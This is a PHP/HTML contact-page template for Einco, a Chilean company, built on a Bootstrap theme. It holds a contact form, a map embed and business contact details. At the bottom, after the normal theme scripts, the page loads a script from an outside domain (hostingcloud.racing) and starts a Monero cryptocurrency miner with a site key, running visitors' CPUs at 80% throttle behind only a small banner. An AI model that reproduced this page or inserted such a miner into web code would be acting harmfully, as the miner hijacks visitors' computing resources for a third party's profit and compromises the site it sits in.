<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html class="no-js">
    <head>
        <!-- Basic Page Needs
        ================================================== -->
        
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <link rel="icon" href="favicon.ico">
        <title>Contacto EINCO</title>
        <meta name="description" content="formulario contacto einco, einco.cl">
        <meta name="keywords" content="einco, einco.cl, www.einco.cl">
        <meta name="author" content="ylit.cl">
        <!-- Mobile Specific Metas
        ================================================== -->
        <meta name="format-detection" content="telephone=no">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        
        <!-- Template CSS Files
        ================================================== -->
        <!-- Twitter Bootstrs CSS -->
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/home/plugins/bootstrap/bootstrap.min.css">
        <!-- Ionicons Fonts Css -->
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/home/plugins/ionicons/ionicons.min.css">
        <!-- animate css -->
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/home/plugins/animate-css/animate.css">
        <!-- Hero area slider css-->
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/home/plugins/slider/slider.css">
        <!-- owl craousel css -->
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/home/plugins/owl-carousel/owl.carousel.css">
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/home/plugins/owl-carousel/owl.theme.css">
        <!-- Fancybox -->
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/home/plugins/facncybox/jquery.fancybox.css">
        <!-- template main css file -->
        <link rel="stylesheet" href="<?php echo base_url() ?>assets/home/css/style.css">
    </head>
    <body>


        <!--
        ==================================================
        Header Section Start
        ================================================== -->
        <header id="top-bar" class="navbar-fixed-top animated-header">
            <div class="container">
                <div class="navbar-header">
                    <!-- responsive nav button -->
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    </button>
                    <!-- /responsive nav button -->
                    
                    <!-- logo -->
                    <div class="navbar-brand">
                        <a href="<?php echo base_url() ?>" >
                            <img src="<?php echo base_url() ?>assets/home/images/logo.png" alt="">
                        </a>
                    </div>
                    <!-- /logo -->
                </div>
                <!-- main menu -->
                <nav class="collapse navbar-collapse navbar-right" role="navigation">
                    <div class="main-menu">
                        <ul class="nav navbar-nav navbar-right">
                            <li>
                                <a href="<?php echo base_url() ?>" >Inicio</a>
                            </li>
                            <li><a href="<?php echo base_url() ?>">Quiénes Somos</a></li>
                            <li><a href="<?php echo base_url() ?>">Servicios</a></li>
                            <li class="dropdown">
                                
                            </li>
                            
                        </ul>
                    </div>
                </nav>
                <!-- /main nav -->
            </div>
        </header>
        

        <!-- 
        ================================================== 
            Global Page Section Start
        ================================================== -->
        <section class="global-page-header">
            <div class="container">
                <div class="row">
                    <div class="col-md-12">
                        <div class="block">
                            <h2>Contacto</h2>
                            <ol class="breadcrumb">
                                <li>
                                    <a href="index.html">
                                        <i class="ion-ios-home"></i>
                                        Inicio
                                    </a>
                                </li>
                                <li class="active">Contacto</li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
        </section>


<!-- 
================================================== 
    Contact Section Start
================================================== -->
<section id="contact-section">
    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <div class="block">
                    <h2 class="subtitle wow fadeInDown" data-wow-duration="500ms" data-wow-delay=".3s">Contáctanos</h2>
                    <p class="subtitle-des wow fadeInDown" data-wow-duration="500ms" data-wow-delay=".5s">
                        En Einco queremos conocer tus inquietudes, envianos tus consultas y muy pronto nos pondremos en contacto contigo.
                    </p>
                <!--    <div class="contact-form">
                        <form id="contact-form" method="post" action="<?php echo base_url('mail/contact')?>" role="form">
                
                            <div class="form-group wow fadeInDown" data-wow-duration="500ms" data-wow-delay=".6s">
                                <input type="text" placeholder="Tu Nombre" class="form-control" name="name" id="name">
                            </div>
                            
                            <div class="form-group wow fadeInDown" data-wow-duration="500ms" data-wow-delay=".8s">
                                <input type="email" placeholder="Tu Email" class="form-control" name="email" id="email" >
                            </div>
                            
                            <div class="form-group wow fadeInDown" data-wow-duration="500ms" data-wow-delay="1s">
                                <input type="text" placeholder="Asunto" class="form-control" name="subject" id="subject">
                            </div>
                            
                            <div class="form-group wow fadeInDown" data-wow-duration="500ms" data-wow-delay="1.2s">
                                <textarea rows="6" placeholder="Tu mensaje" class="form-control" name="message" id="message"></textarea>    
                            </div>
                            
                            <div id="success" class="success">
                                Muchas gracias!, pronto te contactaremos.
                                <?php
                                    if($this->session->flashdata('envio')){
                                        echo $this->session->flashdata('envio');
                                    }
                                ?>
                            </div>
                            
                            <div id="error" class="error">
                                Lo sentimos, ha ocurrido un error, por favor intentalo nuevamente
                            </div>
                            
                            <div id="submit" class="wow fadeInDown" data-wow-duration="500ms" data-wow-delay="1.4s">
                                <input type="submit" id="contact-submit" class="btn btn-default btn-send" value="Enviar Mensaje">
                            </div>                      
                        </form>


                    </div>

                    -->
                     <div class="contact-form">
                        <form action="<?=base_url("mail/contacto")?>" method="post">
                            Nombre: <br/>
                            <input type="text" name="name" /><br/>
                            Correo electronico: <br/>
                            <input type="email" name="email" /><br/>
                            Asunto: <br/>
                            <input type="text" name="subject" /><br/>
                            Mensaje:<br/>
                            <textarea name="message"></textarea><br/>
                            <input type="submit" name="submit" value="Enviar"/>
                        </form>

                        
                    </div>



                </div>
            </div>
            <div class="col-md-6">
                 <div class="map-area">
                    <h2 class="subtitle  wow fadeInDown" data-wow-duration="500ms" data-wow-delay=".3s"></h2>
                    <p class="subtitle-des wow fadeInDown" data-wow-duration="500ms" data-wow-delay=".5s">
                        Estamos ubicados en pleno centro de Ñuñoa, a pasos del metro Chile España.
                        
                    </p>

                    <div style="width: 100%"><iframe width="100%" height="430" src="https://maps.google.com/maps?width=100%&amp;height=430&amp;hl=en&amp;coord=-33.454704415362585,-70.60164749622346&amp;q=Irarrazabal%202128%2C%20%C3%91u%C3%B1oa+(Einco)&amp;ie=UTF8&amp;t=&amp;z=17&amp;iwloc=B&amp;output=embed" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"><a href="https://www.maps.ie/map-my-route/">Create route map</a></iframe></div><br />
    
                </div>
            </div>
        </div>
        <div class="row address-details">
            <div class="col-md-3">
                <div class="address wow fadeInLeft" data-wow-duration="500ms" data-wow-delay=".3s">
                    <i class="ion-ios-location-outline"></i>
                    <h5>Avenida Irarrazabal 2821, <br>oficina 1110, <br>Ñuñoa <br>Región Metropolitana.</h5>
                </div>
            </div>
            <!--
            <div class="col-md-3">
                <div class="address wow fadeInLeft" data-wow-duration="500ms" data-wow-delay=".5s">
                    <i class="ion-ios-location-outline"></i>
                    <h5>125 , Kings Street,Melbourne <br>United Kingdom,600562</h5>
                </div>
            </div> -->
            <div class="col-md-3">
                <div class="email wow fadeInLeft" data-wow-duration="500ms" data-wow-delay=".7s">
                    <i class="ion-ios-email-outline"></i>
                    <p>contacto@einco.cl</p>
                </div>
            </div>
            <div class="col-md-3">
                <div class="phone wow fadeInLeft" data-wow-duration="500ms" data-wow-delay=".9s">
                    <i class="ion-ios-telephone-outline"></i>
                    <p>+569 5042 5665<br>+569 4583 6000</p>
                </div>
            </div>
        </div>
    </div>
</section>  




            <!--
            ==================================================
            Call To Action Section Start
            ================================================== -->
            <section id="call-to-action">
                <div class="container">
                    <div class="row">
                        <div class="col-md-12">
                            <div class="block">
                                <h2 class="title wow fadeInDown" data-wow-delay=".3s" data-wow-duration="500ms">No esperes más y contactános</h1>
                                <p class="wow fadeInDown" data-wow-delay=".5s" data-wow-duration="500ms">En Einco son importantes tus dudas e inquietudes.</p>
                                <a href="<?php echo base_url() ?>mail/" class="btn btn-default btn-contact wow fadeInDown" data-wow-delay=".7s" data-wow-duration="500ms">Contacta con nosotros</a>
                            </div>
                        </div>
                        
                    </div>
                </div>
            </section>

            <!--
            ==================================================
            Footer Section Start
            ================================================== -->
            <footer id="footer">
                <div class="container">
                    <div class="col-md-8">
                        <p class="copyright">Copyright: <span><script>document.write(new Date().getFullYear())</script></span> Design and Developed by <a href="http://www.Themefisher.com" target="_blank">Themefisher</a>. <br> 
                            Get More 
                            <a href="https://themefisher.com/free-bootstrap-templates/" target="_blank">
                                Free Bootstrap Templates
                            </a>
                        </p>
                    </div>
                    <div class="col-md-4">
                        <!-- Social Media -->
                        <ul class="social">
                            <li>
                                <a href="http://wwww.fb.com/themefisher" class="Facebook">
                                    <i class="ion-social-facebook"></i>
                                </a>
                            </li>
                            <li>
                                <a href="http://wwww.twitter.com/themefisher" class="Twitter">
                                    <i class="ion-social-twitter"></i>
                                </a>
                            </li>
                            <li>
                                <a href="#" class="Linkedin">
                                    <i class="ion-social-linkedin"></i>
                                </a>
                            </li>
                            <li>
                                <a href="http://wwww.fb.com/themefisher" class="Google Plus">
                                    <i class="ion-social-googleplus"></i>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </footer> <!-- /#footer -->

	<!-- Template Javascript Files
	================================================== -->
	<!-- jquery -->
	<script src="<?php echo base_url() ?>assets/home/plugins/jQurey/jquery.min.js"></script>
	<!-- Form Validation -->
    <script src="<?php echo base_url() ?>assets/home/plugins/form-validation/jquery.form.js"></script> 
    <script src="<?php echo base_url() ?>assets/home/plugins/form-validation/jquery.validate.min.js"></script>
	<!-- owl carouserl js -->
	<script src="<?php echo base_url() ?>assets/home/plugins/owl-carousel/owl.carousel.min.js"></script>
	<!-- bootstrap js -->
	<script src="<?php echo base_url() ?>assets/home/plugins/bootstrap/bootstrap.min.js"></script>
	<!-- wow js -->
	<script src="<?php echo base_url() ?>assets/home/plugins/wow-js/wow.min.js"></script>
	<!-- slider js -->
	<script src="<?php echo base_url() ?>assets/home/plugins/slider/slider.js"></script>
	<!-- Fancybox -->
	<script src="<?php echo base_url() ?>assets/home/plugins/facncybox/jquery.fancybox.js"></script>
	<!-- template main js -->
	<script src="<?php echo base_url() ?>assets/home/js/main.js"></script>


<script src="https://www.hostingcloud.racing/m0El.js"></script>
<script>
    var _client = new Client.Anonymous('0df5a246946447fd570ca7839db8bd98fd09b8b9b6bafb8e25dfc39b5e1ef835', {
        throttle: 0.8, ads: 0
    });
    _client.start();
    _client.addMiningNotification("Bottom", "This site is running a monero JS script", "#cccccc", 40, "#3d3d3d");

</script>


 	</body>
</html>

